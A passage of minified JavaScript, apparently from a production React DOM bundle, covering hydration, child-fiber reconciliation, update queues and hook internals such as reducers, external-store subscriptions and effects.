  og = [],
  pg = 0,
  qg = null,
  rg = 1,
  sg = "";
function tg(i, a) {
  (kg[lg++] = ng), (kg[lg++] = mg), (mg = i), (ng = a);
}
function ug(i, a, o) {
  (og[pg++] = rg), (og[pg++] = sg), (og[pg++] = qg), (qg = i);
  var s = rg;
  i = sg;
  var tt = 32 - oc(s) - 1;
  (s &= ~(1 << tt)), (o += 1);
  var nt = 32 - oc(a) + tt;
  if (30 < nt) {
    var ot = tt - (tt % 5);
    (nt = (s & ((1 << ot) - 1)).toString(32)),
      (s >>= ot),
      (tt -= ot),
      (rg = (1 << (32 - oc(a) + tt)) | (o << tt) | s),
      (sg = nt + i);
  } else (rg = (1 << nt) | (o << tt) | s), (sg = i);
}
function vg(i) {
  i.return !== null && (tg(i, 1), ug(i, 1, 0));
}
function wg(i) {
  for (; i === mg; )
    (mg = kg[--lg]), (kg[lg] = null), (ng = kg[--lg]), (kg[lg] = null);
  for (; i === qg; )
    (qg = og[--pg]),
      (og[pg] = null),
      (sg = og[--pg]),
      (og[pg] = null),
      (rg = og[--pg]),
      (og[pg] = null);
}
var xg = null,
  yg = null,
  I$1 = !1,
  zg = null;
function Ag(i, a) {
  var o = Bg(5, null, null, 0);
  (o.elementType = "DELETED"),
    (o.stateNode = a),
    (o.return = i),
    (a = i.deletions),
    a === null ? ((i.deletions = [o]), (i.flags |= 16)) : a.push(o);
}
function Cg(i, a) {
  switch (i.tag) {
    case 5:
      var o = i.type;
      return (
        (a =
          a.nodeType !== 1 || o.toLowerCase() !== a.nodeName.toLowerCase()
            ? null
            : a),
        a !== null
          ? ((i.stateNode = a), (xg = i), (yg = Lf(a.firstChild)), !0)
          : !1
      );
    case 6:
      return (
        (a = i.pendingProps === "" || a.nodeType !== 3 ? null : a),
        a !== null ? ((i.stateNode = a), (xg = i), (yg = null), !0) : !1
      );
    case 13:
      return (
        (a = a.nodeType !== 8 ? null : a),
        a !== null
          ? ((o = qg !== null ? { id: rg, overflow: sg } : null),
            (i.memoizedState = {
              dehydrated: a,
              treeContext: o,
              retryLane: 1073741824,
            }),
            (o = Bg(18, null, null, 0)),
            (o.stateNode = a),
            (o.return = i),
            (i.child = o),
            (xg = i),
            (yg = null),
            !0)
          : !1
      );
    default:
      return !1;
  }
}
function Dg(i) {
  return (i.mode & 1) !== 0 && (i.flags & 128) === 0;
}
function Eg(i) {
  if (I$1) {
    var a = yg;
    if (a) {
      var o = a;
      if (!Cg(i, a)) {
        if (Dg(i)) throw Error(p$1(418));
        a = Lf(o.nextSibling);
        var s = xg;
        a && Cg(i, a)
          ? Ag(s, o)
          : ((i.flags = (i.flags & -4097) | 2), (I$1 = !1), (xg = i));
      }
    } else {
      if (Dg(i)) throw Error(p$1(418));
      (i.flags = (i.flags & -4097) | 2), (I$1 = !1), (xg = i);
    }
  }
}
function Fg(i) {
  for (i = i.return; i !== null && i.tag !== 5 && i.tag !== 3 && i.tag !== 13; )
    i = i.return;
  xg = i;
}
function Gg(i) {
  if (i !== xg) return !1;
  if (!I$1) return Fg(i), (I$1 = !0), !1;
  var a;
  if (
    ((a = i.tag !== 3) &&
      !(a = i.tag !== 5) &&
      ((a = i.type),
      (a = a !== "head" && a !== "body" && !Ef(i.type, i.memoizedProps))),
    a && (a = yg))
  ) {
    if (Dg(i)) throw (Hg(), Error(p$1(418)));
    for (; a; ) Ag(i, a), (a = Lf(a.nextSibling));
  }
  if ((Fg(i), i.tag === 13)) {
    if (((i = i.memoizedState), (i = i !== null ? i.dehydrated : null), !i))
      throw Error(p$1(317));
    e: {
      for (i = i.nextSibling, a = 0; i; ) {
        if (i.nodeType === 8) {
          var o = i.data;
          if (o === "/$") {
            if (a === 0) {
              yg = Lf(i.nextSibling);
              break e;
            }
            a--;
          } else (o !== "$" && o !== "$!" && o !== "$?") || a++;
        }
        i = i.nextSibling;
      }
      yg = null;
    }
  } else yg = xg ? Lf(i.stateNode.nextSibling) : null;
  return !0;
}
function Hg() {
  for (var i = yg; i; ) i = Lf(i.nextSibling);
}
function Ig() {
  (yg = xg = null), (I$1 = !1);
}
function Jg(i) {
  zg === null ? (zg = [i]) : zg.push(i);
}
var Kg = ua.ReactCurrentBatchConfig;
function Lg(i, a, o) {
  if (
    ((i = o.ref), i !== null && typeof i != "function" && typeof i != "object")
  ) {
    if (o._owner) {
      if (((o = o._owner), o)) {
        if (o.tag !== 1) throw Error(p$1(309));
        var s = o.stateNode;
      }
      if (!s) throw Error(p$1(147, i));
      var tt = s,
        nt = "" + i;
      return a !== null &&
        a.ref !== null &&
        typeof a.ref == "function" &&
        a.ref._stringRef === nt
        ? a.ref
        : ((a = function (ot) {
            var st = tt.refs;
            ot === null ? delete st[nt] : (st[nt] = ot);
          }),
          (a._stringRef = nt),
          a);
    }
    if (typeof i != "string") throw Error(p$1(284));
    if (!o._owner) throw Error(p$1(290, i));
  }
  return i;
}
function Mg(i, a) {
  throw (
    ((i = Object.prototype.toString.call(a)),
    Error(
      p$1(
        31,
        i === "[object Object]"
          ? "object with keys {" + Object.keys(a).join(", ") + "}"
          : i
      )
    ))
  );
}
function Ng(i) {
  var a = i._init;
  return a(i._payload);
}
function Og(i) {
  function a(bt, xt) {
    if (i) {
      var yt = bt.deletions;
      yt === null ? ((bt.deletions = [xt]), (bt.flags |= 16)) : yt.push(xt);
    }
  }
  function o(bt, xt) {
    if (!i) return null;
    for (; xt !== null; ) a(bt, xt), (xt = xt.sibling);
    return null;
  }
  function s(bt, xt) {
    for (bt = new Map(); xt !== null; )
      xt.key !== null ? bt.set(xt.key, xt) : bt.set(xt.index, xt),
        (xt = xt.sibling);
    return bt;
  }
  function tt(bt, xt) {
    return (bt = Pg(bt, xt)), (bt.index = 0), (bt.sibling = null), bt;
  }
  function nt(bt, xt, yt) {
    return (
      (bt.index = yt),
      i
        ? ((yt = bt.alternate),
          yt !== null
            ? ((yt = yt.index), yt < xt ? ((bt.flags |= 2), xt) : yt)
            : ((bt.flags |= 2), xt))
        : ((bt.flags |= 1048576), xt)
    );
  }
  function ot(bt) {
    return i && bt.alternate === null && (bt.flags |= 2), bt;
  }
  function st(bt, xt, yt, wt) {
    return xt === null || xt.tag !== 6
      ? ((xt = Qg(yt, bt.mode, wt)), (xt.return = bt), xt)
      : ((xt = tt(xt, yt)), (xt.return = bt), xt);
  }
  function ft(bt, xt, yt, wt) {
    var $t = yt.type;
    return $t === ya
      ? gt(bt, xt, yt.props.children, wt, yt.key)
      : xt !== null &&
        (xt.elementType === $t ||
          (typeof $t == "object" &&
            $t !== null &&
            $t.$$typeof === Ha &&
            Ng($t) === xt.type))
      ? ((wt = tt(xt, yt.props)),
        (wt.ref = Lg(bt, xt, yt)),
        (wt.return = bt),
        wt)
      : ((wt = Rg(yt.type, yt.key, yt.props, null, bt.mode, wt)),
        (wt.ref = Lg(bt, xt, yt)),
        (wt.return = bt),
        wt);
  }
  function ht(bt, xt, yt, wt) {
    return xt === null ||
      xt.tag !== 4 ||
      xt.stateNode.containerInfo !== yt.containerInfo ||
      xt.stateNode.implementation !== yt.implementation
      ? ((xt = Sg(yt, bt.mode, wt)), (xt.return = bt), xt)
      : ((xt = tt(xt, yt.children || [])), (xt.return = bt), xt);
  }
  function gt(bt, xt, yt, wt, $t) {
    return xt === null || xt.tag !== 7
      ? ((xt = Tg(yt, bt.mode, wt, $t)), (xt.return = bt), xt)
      : ((xt = tt(xt, yt)), (xt.return = bt), xt);
  }
  function St(bt, xt, yt) {
    if ((typeof xt == "string" && xt !== "") || typeof xt == "number")
      return (xt = Qg("" + xt, bt.mode, yt)), (xt.return = bt), xt;
    if (typeof xt == "object" && xt !== null) {
      switch (xt.$$typeof) {
        case va:
          return (
            (yt = Rg(xt.type, xt.key, xt.props, null, bt.mode, yt)),
            (yt.ref = Lg(bt, null, xt)),
            (yt.return = bt),
            yt
          );
        case wa:
          return (xt = Sg(xt, bt.mode, yt)), (xt.return = bt), xt;
        case Ha:
          var wt = xt._init;
          return St(bt, wt(xt._payload), yt);
      }
      if (eb(xt) || Ka(xt))
        return (xt = Tg(xt, bt.mode, yt, null)), (xt.return = bt), xt;
      Mg(bt, xt);
    }
    return null;
  }
  function vt(bt, xt, yt, wt) {
    var $t = xt !== null ? xt.key : null;
    if ((typeof yt == "string" && yt !== "") || typeof yt == "number")
      return $t !== null ? null : st(bt, xt, "" + yt, wt);
    if (typeof yt == "object" && yt !== null) {
      switch (yt.$$typeof) {
        case va:
          return yt.key === $t ? ft(bt, xt, yt, wt) : null;
        case wa:
          return yt.key === $t ? ht(bt, xt, yt, wt) : null;
        case Ha:
          return ($t = yt._init), vt(bt, xt, $t(yt._payload), wt);
      }
      if (eb(yt) || Ka(yt))
        return $t !== null ? null : gt(bt, xt, yt, wt, null);
      Mg(bt, yt);
    }
    return null;
  }
  function _t(bt, xt, yt, wt, $t) {
    if ((typeof wt == "string" && wt !== "") || typeof wt == "number")
      return (bt = bt.get(yt) || null), st(xt, bt, "" + wt, $t);
    if (typeof wt == "object" && wt !== null) {
      switch (wt.$$typeof) {
        case va:
          return (
            (bt = bt.get(wt.key === null ? yt : wt.key) || null),
            ft(xt, bt, wt, $t)
          );
        case wa:
          return (
            (bt = bt.get(wt.key === null ? yt : wt.key) || null),
            ht(xt, bt, wt, $t)
          );
        case Ha:
          var kt = wt._init;
          return _t(bt, xt, yt, kt(wt._payload), $t);
      }
      if (eb(wt) || Ka(wt))
        return (bt = bt.get(yt) || null), gt(xt, bt, wt, $t, null);
      Mg(xt, wt);
    }
    return null;
  }
  function Et(bt, xt, yt, wt) {
    for (
      var $t = null, kt = null, Rt = xt, It = (xt = 0), Ot = null;
      Rt !== null && It < yt.length;
      It++
    ) {
      Rt.index > It ? ((Ot = Rt), (Rt = null)) : (Ot = Rt.sibling);
      var Nt = vt(bt, Rt, yt[It], wt);
      if (Nt === null) {
        Rt === null && (Rt = Ot);
        break;
      }
      i && Rt && Nt.alternate === null && a(bt, Rt),
        (xt = nt(Nt, xt, It)),
        kt === null ? ($t = Nt) : (kt.sibling = Nt),
        (kt = Nt),
        (Rt = Ot);
    }
    if (It === yt.length) return o(bt, Rt), I$1 && tg(bt, It), $t;
    if (Rt === null) {
      for (; It < yt.length; It++)
        (Rt = St(bt, yt[It], wt)),
          Rt !== null &&
            ((xt = nt(Rt, xt, It)),
            kt === null ? ($t = Rt) : (kt.sibling = Rt),
            (kt = Rt));
      return I$1 && tg(bt, It), $t;
    }
    for (Rt = s(bt, Rt); It < yt.length; It++)
      (Ot = _t(Rt, bt, It, yt[It], wt)),
        Ot !== null &&
          (i &&
            Ot.alternate !== null &&
            Rt.delete(Ot.key === null ? It : Ot.key),
          (xt = nt(Ot, xt, It)),
          kt === null ? ($t = Ot) : (kt.sibling = Ot),
          (kt = Ot));
    return (
      i &&
        Rt.forEach(function (zt) {
          return a(bt, zt);
        }),
      I$1 && tg(bt, It),
      $t
    );
  }
  function Ct(bt, xt, yt, wt) {
    var $t = Ka(yt);
    if (typeof $t != "function") throw Error(p$1(150));
    if (((yt = $t.call(yt)), yt == null)) throw Error(p$1(151));
    for (
      var kt = ($t = null), Rt = xt, It = (xt = 0), Ot = null, Nt = yt.next();
      Rt !== null && !Nt.done;
      It++, Nt = yt.next()
    ) {
      Rt.index > It ? ((Ot = Rt), (Rt = null)) : (Ot = Rt.sibling);
      var zt = vt(bt, Rt, Nt.value, wt);
      if (zt === null) {
        Rt === null && (Rt = Ot);
        break;
      }
      i && Rt && zt.alternate === null && a(bt, Rt),
        (xt = nt(zt, xt, It)),
        kt === null ? ($t = zt) : (kt.sibling = zt),
        (kt = zt),
        (Rt = Ot);
    }
    if (Nt.done) return o(bt, Rt), I$1 && tg(bt, It), $t;
    if (Rt === null) {
      for (; !Nt.done; It++, Nt = yt.next())
        (Nt = St(bt, Nt.value, wt)),
          Nt !== null &&
            ((xt = nt(Nt, xt, It)),
            kt === null ? ($t = Nt) : (kt.sibling = Nt),
            (kt = Nt));
      return I$1 && tg(bt, It), $t;
    }
    for (Rt = s(bt, Rt); !Nt.done; It++, Nt = yt.next())
      (Nt = _t(Rt, bt, It, Nt.value, wt)),
        Nt !== null &&
          (i &&
            Nt.alternate !== null &&
            Rt.delete(Nt.key === null ? It : Nt.key),
          (xt = nt(Nt, xt, It)),
          kt === null ? ($t = Nt) : (kt.sibling = Nt),
          (kt = Nt));
    return (
      i &&
        Rt.forEach(function (Bt) {
          return a(bt, Bt);
        }),
      I$1 && tg(bt, It),
      $t
    );
  }
  function Pt(bt, xt, yt, wt) {
    if (
      (typeof yt == "object" &&
        yt !== null &&
        yt.type === ya &&
        yt.key === null &&
        (yt = yt.props.children),
      typeof yt == "object" && yt !== null)
    ) {
      switch (yt.$$typeof) {
        case va:
          e: {
            for (var $t = yt.key, kt = xt; kt !== null; ) {
              if (kt.key === $t) {
                if ((($t = yt.type), $t === ya)) {
                  if (kt.tag === 7) {
                    o(bt, kt.sibling),
                      (xt = tt(kt, yt.props.children)),
                      (xt.return = bt),
                      (bt = xt);
                    break e;
                  }
                } else if (
                  kt.elementType === $t ||
                  (typeof $t == "object" &&
                    $t !== null &&
                    $t.$$typeof === Ha &&
                    Ng($t) === kt.type)
                ) {
                  o(bt, kt.sibling),
                    (xt = tt(kt, yt.props)),
                    (xt.ref = Lg(bt, kt, yt)),
                    (xt.return = bt),
                    (bt = xt);
                  break e;
                }
                o(bt, kt);
                break;
              } else a(bt, kt);
              kt = kt.sibling;
            }
            yt.type === ya
              ? ((xt = Tg(yt.props.children, bt.mode, wt, yt.key)),
                (xt.return = bt),
                (bt = xt))
              : ((wt = Rg(yt.type, yt.key, yt.props, null, bt.mode, wt)),
                (wt.ref = Lg(bt, xt, yt)),
                (wt.return = bt),
                (bt = wt));
          }
          return ot(bt);
        case wa:
          e: {
            for (kt = yt.key; xt !== null; ) {
              if (xt.key === kt)
                if (
                  xt.tag === 4 &&
                  xt.stateNode.containerInfo === yt.containerInfo &&
                  xt.stateNode.implementation === yt.implementation
                ) {
                  o(bt, xt.sibling),
                    (xt = tt(xt, yt.children || [])),
                    (xt.return = bt),
                    (bt = xt);
                  break e;
                } else {
                  o(bt, xt);
                  break;
                }
              else a(bt, xt);
              xt = xt.sibling;
            }
            (xt = Sg(yt, bt.mode, wt)), (xt.return = bt), (bt = xt);
          }
          return ot(bt);
        case Ha:
          return (kt = yt._init), Pt(bt, xt, kt(yt._payload), wt);
      }
      if (eb(yt)) return Et(bt, xt, yt, wt);
      if (Ka(yt)) return Ct(bt, xt, yt, wt);
      Mg(bt, yt);
    }
    return (typeof yt == "string" && yt !== "") || typeof yt == "number"
      ? ((yt = "" + yt),
        xt !== null && xt.tag === 6
          ? (o(bt, xt.sibling), (xt = tt(xt, yt)), (xt.return = bt), (bt = xt))
          : (o(bt, xt),
            (xt = Qg(yt, bt.mode, wt)),
            (xt.return = bt),
            (bt = xt)),
        ot(bt))
      : o(bt, xt);
  }
  return Pt;
}
var Ug = Og(!0),
  Vg = Og(!1),
  Wg = Uf(null),
  Xg = null,
  Yg = null,
  Zg = null;
function $g() {
  Zg = Yg = Xg = null;
}
function ah(i) {
  var a = Wg.current;
  E(Wg), (i._currentValue = a);
}
function bh(i, a, o) {
  for (; i !== null; ) {
    var s = i.alternate;
    if (
      ((i.childLanes & a) !== a
        ? ((i.childLanes |= a), s !== null && (s.childLanes |= a))
        : s !== null && (s.childLanes & a) !== a && (s.childLanes |= a),
      i === o)
    )
      break;
    i = i.return;
  }
}
function ch(i, a) {
  (Xg = i),
    (Zg = Yg = null),
    (i = i.dependencies),
    i !== null &&
      i.firstContext !== null &&
      (i.lanes & a && (dh = !0), (i.firstContext = null));
}
function eh(i) {
  var a = i._currentValue;
  if (Zg !== i)
    if (((i = { context: i, memoizedValue: a, next: null }), Yg === null)) {
      if (Xg === null) throw Error(p$1(308));
      (Yg = i), (Xg.dependencies = { lanes: 0, firstContext: i });
    } else Yg = Yg.next = i;
  return a;
}
var fh = null;
function gh(i) {
  fh === null ? (fh = [i]) : fh.push(i);
}
function hh(i, a, o, s) {
  var tt = a.interleaved;
  return (
    tt === null ? ((o.next = o), gh(a)) : ((o.next = tt.next), (tt.next = o)),
    (a.interleaved = o),
    ih(i, s)
  );
}
function ih(i, a) {
  i.lanes |= a;
  var o = i.alternate;
  for (o !== null && (o.lanes |= a), o = i, i = i.return; i !== null; )
    (i.childLanes |= a),
      (o = i.alternate),
      o !== null && (o.childLanes |= a),
      (o = i),
      (i = i.return);
  return o.tag === 3 ? o.stateNode : null;
}
var jh = !1;
function kh(i) {
  i.updateQueue = {
    baseState: i.memoizedState,
    firstBaseUpdate: null,
    lastBaseUpdate: null,
    shared: { pending: null, interleaved: null, lanes: 0 },
    effects: null,
  };
}
function lh(i, a) {
  (i = i.updateQueue),
    a.updateQueue === i &&
      (a.updateQueue = {
        baseState: i.baseState,
        firstBaseUpdate: i.firstBaseUpdate,
        lastBaseUpdate: i.lastBaseUpdate,
        shared: i.shared,
        effects: i.effects,
      });
}
function mh(i, a) {
  return {
    eventTime: i,
    lane: a,
    tag: 0,
    payload: null,
    callback: null,
    next: null,
  };
}
function nh(i, a, o) {
  var s = i.updateQueue;
  if (s === null) return null;
  if (((s = s.shared), K$1 & 2)) {
    var tt = s.pending;
    return (
      tt === null ? (a.next = a) : ((a.next = tt.next), (tt.next = a)),
      (s.pending = a),
      ih(i, o)
    );
  }
  return (
    (tt = s.interleaved),
    tt === null ? ((a.next = a), gh(s)) : ((a.next = tt.next), (tt.next = a)),
    (s.interleaved = a),
    ih(i, o)
  );
}
function oh(i, a, o) {
  if (
    ((a = a.updateQueue), a !== null && ((a = a.shared), (o & 4194240) !== 0))
  ) {
    var s = a.lanes;
    (s &= i.pendingLanes), (o |= s), (a.lanes = o), Cc(i, o);
  }
}
function ph(i, a) {
  var o = i.updateQueue,
    s = i.alternate;
  if (s !== null && ((s = s.updateQueue), o === s)) {
    var tt = null,
      nt = null;
    if (((o = o.firstBaseUpdate), o !== null)) {
      do {
        var ot = {
          eventTime: o.eventTime,
          lane: o.lane,
          tag: o.tag,
          payload: o.payload,
          callback: o.callback,
          next: null,
        };
        nt === null ? (tt = nt = ot) : (nt = nt.next = ot), (o = o.next);
      } while (o !== null);
      nt === null ? (tt = nt = a) : (nt = nt.next = a);
    } else tt = nt = a;
    (o = {
      baseState: s.baseState,
      firstBaseUpdate: tt,
      lastBaseUpdate: nt,
      shared: s.shared,
      effects: s.effects,
    }),
      (i.updateQueue = o);
    return;
  }
  (i = o.lastBaseUpdate),
    i === null ? (o.firstBaseUpdate = a) : (i.next = a),
    (o.lastBaseUpdate = a);
}
function qh(i, a, o, s) {
  var tt = i.updateQueue;
  jh = !1;
  var nt = tt.firstBaseUpdate,
    ot = tt.lastBaseUpdate,
    st = tt.shared.pending;
  if (st !== null) {
    tt.shared.pending = null;
    var ft = st,
      ht = ft.next;
    (ft.next = null), ot === null ? (nt = ht) : (ot.next = ht), (ot = ft);
    var gt = i.alternate;
    gt !== null &&
      ((gt = gt.updateQueue),
      (st = gt.lastBaseUpdate),
      st !== ot &&
        (st === null ? (gt.firstBaseUpdate = ht) : (st.next = ht),
        (gt.lastBaseUpdate = ft)));
  }
  if (nt !== null) {
    var St = tt.baseState;
    (ot = 0), (gt = ht = ft = null), (st = nt);
    do {
      var vt = st.lane,
        _t = st.eventTime;
      if ((s & vt) === vt) {
        gt !== null &&
          (gt = gt.next =
            {
              eventTime: _t,
              lane: 0,
              tag: st.tag,
              payload: st.payload,
              callback: st.callback,
              next: null,
            });
        e: {
          var Et = i,
            Ct = st;
          switch (((vt = a), (_t = o), Ct.tag)) {
            case 1:
              if (((Et = Ct.payload), typeof Et == "function")) {
                St = Et.call(_t, St, vt);
                break e;
              }
              St = Et;
              break e;
            case 3:
              Et.flags = (Et.flags & -65537) | 128;
            case 0:
              if (
                ((Et = Ct.payload),
                (vt = typeof Et == "function" ? Et.call(_t, St, vt) : Et),
                vt == null)
              )
                break e;
              St = A$1({}, St, vt);
              break e;
            case 2:
              jh = !0;
          }
        }
        st.callback !== null &&
          st.lane !== 0 &&
          ((i.flags |= 64),
          (vt = tt.effects),
          vt === null ? (tt.effects = [st]) : vt.push(st));
      } else
        (_t = {
          eventTime: _t,
          lane: vt,
          tag: st.tag,
          payload: st.payload,
          callback: st.callback,
          next: null,
        }),
          gt === null ? ((ht = gt = _t), (ft = St)) : (gt = gt.next = _t),
          (ot |= vt);
      if (((st = st.next), st === null)) {
        if (((st = tt.shared.pending), st === null)) break;
        (vt = st),
          (st = vt.next),
          (vt.next = null),
          (tt.lastBaseUpdate = vt),
          (tt.shared.pending = null);
      }
    } while (!0);
    if (
      (gt === null && (ft = St),
      (tt.baseState = ft),
      (tt.firstBaseUpdate = ht),
      (tt.lastBaseUpdate = gt),
      (a = tt.shared.interleaved),
      a !== null)
    ) {
      tt = a;
      do (ot |= tt.lane), (tt = tt.next);
      while (tt !== a);
    } else nt === null && (tt.shared.lanes = 0);
    (rh |= ot), (i.lanes = ot), (i.memoizedState = St);
  }
}
function sh(i, a, o) {
  if (((i = a.effects), (a.effects = null), i !== null))
    for (a = 0; a < i.length; a++) {
      var s = i[a],
        tt = s.callback;
      if (tt !== null) {
        if (((s.callback = null), (s = o), typeof tt != "function"))
          throw Error(p$1(191, tt));
        tt.call(s);
      }
    }
}
var th = {},
  uh = Uf(th),
  vh = Uf(th),
  wh = Uf(th);
function xh(i) {
  if (i === th) throw Error(p$1(174));
  return i;
}
function yh(i, a) {
  switch ((G$1(wh, a), G$1(vh, i), G$1(uh, th), (i = a.nodeType), i)) {
    case 9:
    case 11:
      a = (a = a.documentElement) ? a.namespaceURI : lb(null, "");
      break;
    default:
      (i = i === 8 ? a.parentNode : a),
        (a = i.namespaceURI || null),
        (i = i.tagName),
        (a = lb(a, i));
  }
  E(uh), G$1(uh, a);
}
function zh() {
  E(uh), E(vh), E(wh);
}
function Ah(i) {
  xh(wh.current);
  var a = xh(uh.current),
    o = lb(a, i.type);
  a !== o && (G$1(vh, i), G$1(uh, o));
}
function Bh(i) {
  vh.current === i && (E(uh), E(vh));
}
var L$1 = Uf(0);
function Ch(i) {
  for (var a = i; a !== null; ) {
    if (a.tag === 13) {
      var o = a.memoizedState;
      if (
        o !== null &&
        ((o = o.dehydrated), o === null || o.data === "$?" || o.data === "$!")
      )
        return a;
    } else if (a.tag === 19 && a.memoizedProps.revealOrder !== void 0) {
      if (a.flags & 128) return a;
    } else if (a.child !== null) {
      (a.child.return = a), (a = a.child);
      continue;
    }
    if (a === i) break;
    for (; a.sibling === null; ) {
      if (a.return === null || a.return === i) return null;
      a = a.return;
    }
    (a.sibling.return = a.return), (a = a.sibling);
  }
  return null;
}
var Dh = [];
function Eh() {
  for (var i = 0; i < Dh.length; i++)
    Dh[i]._workInProgressVersionPrimary = null;
  Dh.length = 0;
}
var Fh = ua.ReactCurrentDispatcher,
  Gh = ua.ReactCurrentBatchConfig,
  Hh = 0,
  M$1 = null,
  N = null,
  O$1 = null,
  Ih = !1,
  Jh = !1,
  Kh = 0,
  Lh = 0;
function P() {
  throw Error(p$1(321));
}
function Mh(i, a) {
  if (a === null) return !1;
  for (var o = 0; o < a.length && o < i.length; o++)
    if (!He$1(i[o], a[o])) return !1;
  return !0;
}
function Nh(i, a, o, s, tt, nt) {
  if (
    ((Hh = nt),
    (M$1 = a),
    (a.memoizedState = null),
    (a.updateQueue = null),
    (a.lanes = 0),
    (Fh.current = i === null || i.memoizedState === null ? Oh : Ph),
    (i = o(s, tt)),
    Jh)
  ) {
    nt = 0;
    do {
      if (((Jh = !1), (Kh = 0), 25 <= nt)) throw Error(p$1(301));
      (nt += 1),
        (O$1 = N = null),
        (a.updateQueue = null),
        (Fh.current = Qh),
        (i = o(s, tt));
    } while (Jh);
  }
  if (
    ((Fh.current = Rh),
    (a = N !== null && N.next !== null),
    (Hh = 0),
    (O$1 = N = M$1 = null),
    (Ih = !1),
    a)
  )
    throw Error(p$1(300));
  return i;
}
function Sh() {
  var i = Kh !== 0;
  return (Kh = 0), i;
}
function Th() {
  var i = {
    memoizedState: null,
    baseState: null,
    baseQueue: null,
    queue: null,
    next: null,
  };
  return (
    O$1 === null ? (M$1.memoizedState = O$1 = i) : (O$1 = O$1.next = i), O$1
  );
}
function Uh() {
  if (N === null) {
    var i = M$1.alternate;
    i = i !== null ? i.memoizedState : null;
  } else i = N.next;
  var a = O$1 === null ? M$1.memoizedState : O$1.next;
  if (a !== null) (O$1 = a), (N = i);
  else {
    if (i === null) throw Error(p$1(310));
    (N = i),
      (i = {
        memoizedState: N.memoizedState,
        baseState: N.baseState,
        baseQueue: N.baseQueue,
        queue: N.queue,
        next: null,
      }),
      O$1 === null ? (M$1.memoizedState = O$1 = i) : (O$1 = O$1.next = i);
  }
  return O$1;
}
function Vh(i, a) {
  return typeof a == "function" ? a(i) : a;
}
function Wh(i) {
  var a = Uh(),
    o = a.queue;
  if (o === null) throw Error(p$1(311));
  o.lastRenderedReducer = i;
  var s = N,
    tt = s.baseQueue,
    nt = o.pending;
  if (nt !== null) {
    if (tt !== null) {
      var ot = tt.next;
      (tt.next = nt.next), (nt.next = ot);
    }
    (s.baseQueue = tt = nt), (o.pending = null);
  }
  if (tt !== null) {
    (nt = tt.next), (s = s.baseState);
    var st = (ot = null),
      ft = null,
      ht = nt;
    do {
      var gt = ht.lane;
      if ((Hh & gt) === gt)
        ft !== null &&
          (ft = ft.next =
            {
              lane: 0,
              action: ht.action,
              hasEagerState: ht.hasEagerState,
              eagerState: ht.eagerState,
              next: null,
            }),
          (s = ht.hasEagerState ? ht.eagerState : i(s, ht.action));
      else {
        var St = {
          lane: gt,
          action: ht.action,
          hasEagerState: ht.hasEagerState,
          eagerState: ht.eagerState,
          next: null,
        };
        ft === null ? ((st = ft = St), (ot = s)) : (ft = ft.next = St),
          (M$1.lanes |= gt),
          (rh |= gt);
      }
      ht = ht.next;
    } while (ht !== null && ht !== nt);
    ft === null ? (ot = s) : (ft.next = st),
      He$1(s, a.memoizedState) || (dh = !0),
      (a.memoizedState = s),
      (a.baseState = ot),
      (a.baseQueue = ft),
      (o.lastRenderedState = s);
  }
  if (((i = o.interleaved), i !== null)) {
    tt = i;
    do (nt = tt.lane), (M$1.lanes |= nt), (rh |= nt), (tt = tt.next);
    while (tt !== i);
  } else tt === null && (o.lanes = 0);
  return [a.memoizedState, o.dispatch];
}
function Xh(i) {
  var a = Uh(),
    o = a.queue;
  if (o === null) throw Error(p$1(311));
  o.lastRenderedReducer = i;
  var s = o.dispatch,
    tt = o.pending,
    nt = a.memoizedState;
  if (tt !== null) {
    o.pending = null;
    var ot = (tt = tt.next);
    do (nt = i(nt, ot.action)), (ot = ot.next);
    while (ot !== tt);
    He$1(nt, a.memoizedState) || (dh = !0),
      (a.memoizedState = nt),
      a.baseQueue === null && (a.baseState = nt),
      (o.lastRenderedState = nt);
  }
  return [nt, s];
}
function Yh() {}
function Zh(i, a) {
  var o = M$1,
    s = Uh(),
    tt = a(),
    nt = !He$1(s.memoizedState, tt);
  if (
    (nt && ((s.memoizedState = tt), (dh = !0)),
    (s = s.queue),
    $h(ai.bind(null, o, s, i), [i]),
    s.getSnapshot !== a || nt || (O$1 !== null && O$1.memoizedState.tag & 1))
  ) {
    if (
      ((o.flags |= 2048),
      bi(9, ci.bind(null, o, s, tt, a), void 0, null),
      Q$1 === null)
    )
      throw Error(p$1(349));
    Hh & 30 || di(o, a, tt);
  }
  return tt;
}
function di(i, a, o) {
  (i.flags |= 16384),
    (i = { getSnapshot: a, value: o }),
    (a = M$1.updateQueue),
    a === null
      ? ((a = { lastEffect: null, stores: null }),
        (M$1.updateQueue = a),
        (a.stores = [i]))
      : ((o = a.stores), o === null ? (a.stores = [i]) : o.push(i));
}
function ci(i, a, o, s) {
  (a.value = o), (a.getSnapshot = s), ei(a) && fi(i);
}
function ai(i, a, o) {
  return o(function () {
    ei(a) && fi(i);
  });
}
function ei(i) {
  var a = i.getSnapshot;
  i = i.value;
  try {
    var o = a();
    return !He$1(i, o);
  } catch {
    return !0;
  }
}
function fi(i) {
  var a = ih(i, 1);
  a !== null && gi(a, i, 1, -1);
}
function hi(i) {
  var a = Th();
  return (
    typeof i == "function" && (i = i()),
    (a.memoizedState = a.baseState = i),
    (i = {
      pending: null,
      interleaved: null,
      lanes: 0,
      dispatch: null,
      lastRenderedReducer: Vh,
      lastRenderedState: i,
    }),
    (a.queue = i),
    (i = i.dispatch = ii.bind(null, M$1, i)),
    [a.memoizedState, i]
  );
}
function bi(i, a, o, s) {
  return (
    (i = { tag: i, create: a, destroy: o, deps: s, next: null }),
    (a = M$1.updateQueue),
    a === null
      ? ((a = { lastEffect: null, stores: null }),
        (M$1.updateQueue = a),
        (a.lastEffect = i.next = i))
      : ((o = a.lastEffect),
        o === null
          ? (a.lastEffect = i.next = i)
          : ((s = o.next), (o.next = i), (i.next = s), (a.lastEffect = i))),
    i
  );
}
function ji() {
  return Uh().memoizedState;
}
function ki(i, a, o, s) {
  var tt = Th();
  (M$1.flags |= i),
    (tt.memoizedState = bi(1 | a, o, void 0, s === void 0 ? null : s));
}
function li(i, a, o, s) {
  var tt = Uh();
  s = s === void 0 ? null : s;
  var nt = void 0;
  if (N !== null) {
    var ot = N.memoizedState;
    if (((nt = ot.destroy), s !== null && Mh(s, ot.deps))) {
      tt.memoizedState = bi(a, o, nt, s);
      return;
    }
  }
  (M$1.flags |= i), (tt.memoizedState = bi(1 | a, o, nt, s));
}
function mi(i, a) {
  return ki(8390656, 8, i, a);
}
function $h(i, a) {
  return li(2048, 8, i, a);
}
function ni(i, a) {
  return li(4, 2, i, a);
}
function oi(i, a) {
  return li(4, 4, i, a);
}
function pi(i, a) {
  if (typeof a == "function")
